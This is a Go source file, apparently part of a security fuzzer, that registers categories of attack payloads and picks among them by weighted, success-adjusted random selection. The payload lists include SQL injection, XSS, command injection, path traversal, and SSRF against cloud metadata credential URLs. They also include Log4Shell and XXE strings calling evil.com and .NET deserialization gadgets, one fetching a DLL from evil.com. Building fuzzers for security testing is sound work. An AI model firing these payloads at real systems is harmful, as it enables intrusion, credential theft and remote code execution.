package main

import (
	"math/rand"
	"strings"
	"sync"
)

// mutations.go — MOpt-style mutation category registry:
// security payload lists, adaptive weighted selection, hit/attempt tracking.

// MutationCategory groups related payloads for MOpt-like adaptive selection.
// Weight is adjusted at runtime: successful categories get more selection probability.
type MutationCategory struct {
	Name     string
	Payloads []string
	Attempts int
	Hits     int
	Weight   float64
}

// mutationCategories is the global registry. Initialized once in init().
// mutCatMu protects all reads/writes to mutationCategories fields (Hits, Attempts, Weight),
// which are accessed concurrently from worker goroutines and the main scheduling loop.
var (
	mutationCategories []*MutationCategory
	mutCatMu           sync.RWMutex
)

// ssrfMetadataPayloads is the subset of the "ssrf" category's payloads that target a cloud
// metadata service specifically (as opposed to generic localhost/loopback/file/dict/gopher
// SSRF probes below, which the exploitationSignals oracle doesn't apply metadata markers
// to). Shared with identity.go::exploitationSignals so it can strip these exact strings out
// of a response body before checking for real metadata content -- otherwise an endpoint
// that simply echoes back whatever it was given (store-then-return, a common REST pattern)
// would trivially "leak metadata" by handing us back the very URL we submitted.
var ssrfMetadataPayloads = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://metadata.google.internal/computeMetadata/v1/",
	"http://100.100.100.200/latest/meta-data/",
}

func init() {
	mutationCategories = []*MutationCategory{
		{Name: "boundary", Weight: 1.0, Payloads: []string{
			"",
			"null", "undefined", "NaN", "Infinity", "-Infinity",
		}},
		{Name: "overflow", Weight: 1.0, Payloads: []string{
			strings.Repeat("A", 100),
			strings.Repeat("A", 1024),
			strings.Repeat("A", 5000),
			strings.Repeat("A", 10000),
		}},
		{Name: "sqli", Weight: 1.5, Payloads: []string{
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"' UNION SELECT 1,2,3,4,5--",
			"1; SELECT SLEEP(5)--",
			// Short sleeps stay under the request timeout so the latency delta is
			// observable by the time-based SQLi oracle (see checkInjectionOracle).
			"1' AND SLEEP(2)-- -",
			"1) AND SLEEP(2)-- -",
			"1'; WAITFOR DELAY '0:0:2'-- -",
			"1 AND pg_sleep(2)",
			"1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x716b6b71,0x41,0x7162627171,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
			"' OR 1=1--",
			"admin'--",
		}},
		{Name: "xss", Weight: 1.5, Payloads: []string{
			"<script>alert(1)</script>",
			`<img src=x onerror=alert(document.domain)>`,
			`"><svg/onload=alert(1)>`,
			`javascript:alert(1)`,
			`<details open ontoggle=alert(1)>`,
			`'-alert(1)-'`,
		}},
		{Name: "cmdi", Weight: 1.5, Payloads: []string{
			"; id",
			"| cat /etc/passwd",
			"`id`",
			"$(id)",
			"; ping -c 3 127.0.0.1",
			"%0aid",
			"|| whoami",
		}},
		{Name: "path_traversal", Weight: 1.5, Payloads: []string{
			"../../../etc/passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			`..\\..\\..\\windows\\system32\\config\\sam`,
			"....//....//....//etc/passwd",
			"..%252f..%252f..%252fetc%252fpasswd",
		}},
		{Name: "ssrf", Weight: 1.5, Payloads: append(append([]string{}, ssrfMetadataPayloads...), []string{
			"http://localhost/",
			"http://0.0.0.0/",
			"http://[::1]/",
			"http://127.1/",
			"http://0x7f000001/",
			"file:///etc/passwd",
			"file:///proc/self/environ",
			"dict://localhost:6379/INFO",
			"gopher://localhost:6379/_%2A1%0D%0A",
		}...)},
		{Name: "open_redirect", Weight: 1.0, Payloads: []string{
			"//evil.com",
			"\\/\\/evil.com",
			"https://evil.com",
			"/\\evil.com",
			"/%0d/evil.com",
		}},
		{Name: "crlf", Weight: 1.0, Payloads: []string{
			"foo\r\nX-Injected: pwned",
			"foo\r\nTransfer-Encoding: chunked\r\n",
			"foo%0d%0aX-Injected:%20pwned",
		}},
		{Name: "ssti", Weight: 1.5, Payloads: []string{
			"{{7*7}}",
			"${7*7}",
			"#{7*7}",
			"*{7*7}",
			"@(7*7)",
			"<%= 7*7 %>",
			// Distinctive markers: the products (1787569 / 5557500) are highly
			// improbable to appear by chance, so detecting them in a response is a
			// low-false-positive signal that the expression was actually evaluated.
			"{{1337*1337}}",
			"${1337*1337}",
			"#{2340*2375}",
			"{{2340*2375}}",
			"{{constructor.constructor('return this')()}}",
		}},
		{Name: "log4shell", Weight: 1.0, Payloads: []string{
			"${jndi:ldap://evil.com/x}",
			"${jndi:dns://evil.com/x}",
			"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/x}",
		}},
		{Name: "nosqli", Weight: 1.0, Payloads: []string{
			`{"$gt":""}`,
			`{"$ne":null}`,
			`{"$where":"sleep(5000)"}`,
			`{"$regex":".*"}`,
		}},
		{Name: "ldap", Weight: 1.0, Payloads: []string{
			"*)(uid=*))(|(uid=*",
			"admin)(&)",
		}},
		{Name: "xxe", Weight: 1.0, Payloads: []string{
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>`,
		}},
		// .NET insecure-deserialization gadgets. When a target uses Json.NET with
		// TypeNameHandling != None (or BinaryFormatter / a permissive JsonSerializer),
		// a `$type` directive can instantiate arbitrary types — a classic .NET RCE
		// primitive. A 500 with a type-load / binder exception on these is a strong
		// signal the endpoint honors `$type`.
		{Name: "dotnet_deser", Weight: 1.4, Payloads: []string{
			`{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}`,
			`{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a","Path":"http://evil.com/x.dll"}`,
			`{"$type":"System.Collections.Generic.List` + "`" + `1[[System.Object]], mscorlib","$values":[]}`,
			`{"$type":"System.IO.FileInfo, System.IO.FileSystem","fileName":"/etc/passwd","IsReadOnly":false}`,
			`{"$type":"System.Data.Services.Internal.ExpandedWrapper` + "`" + `2[[System.String, mscorlib],[System.Windows.Markup.XamlReader, PresentationFramework]], System.Data.Services"}`,
		}},
		{Name: "unicode", Weight: 1.0, Payloads: []string{
			"\xef\xbc\xae\xef\xbc\xaf\xef\xbc\xb2\xef\xbc\xad",
			"admin\u200b",
			"a]dmin",
		}},
	}
}

// pickMutationCategory selects a category using MOpt-style weighted random.
// Categories that find more coverage edges get higher selection probability.
func pickMutationCategory() *MutationCategory {
	mutCatMu.RLock()
	defer mutCatMu.RUnlock()
	total := 0.0
	for _, c := range mutationCategories {
		total += c.Weight
	}
	if total <= 0 {
		return mutationCategories[rand.Intn(len(mutationCategories))]
	}
	r := rand.Float64() * total
	for _, c := range mutationCategories {
		r -= c.Weight
		if r <= 0 {
			return c
		}
	}
	return mutationCategories[len(mutationCategories)-1]
}

// updateMutationCategoryWeights recalculates weights based on success rates.
// Called periodically from the main loop. Implements a simplified PSO/bandit:
// weight = base + bonus * (hits / attempts), so productive categories
// get up to 3x their base weight.
func updateMutationCategoryWeights() {
	mutCatMu.Lock()
	defer mutCatMu.Unlock()
	for _, c := range mutationCategories {
		if c.Attempts == 0 {
			continue
		}
		hitRate := float64(c.Hits) / float64(c.Attempts)
		c.Weight = 1.0 + hitRate*4.0
	}
}

// recordMutationCategoryHit is called when a mutation label finds new edges.
func recordMutationCategoryHit(label string) {
	mutCatMu.Lock()
	defer mutCatMu.Unlock()
	for _, c := range mutationCategories {
		if strings.Contains(label, "mcat_"+c.Name) {
			c.Hits++
			return
		}
	}
}

// recordMutationCategoryAttempt marks an attempt for the category in the label.
func recordMutationCategoryAttempt(label string) {
	mutCatMu.Lock()
	defer mutCatMu.Unlock()
	for _, c := range mutationCategories {
		if strings.Contains(label, "mcat_"+c.Name) {
			c.Attempts++
			return
		}
	}
}
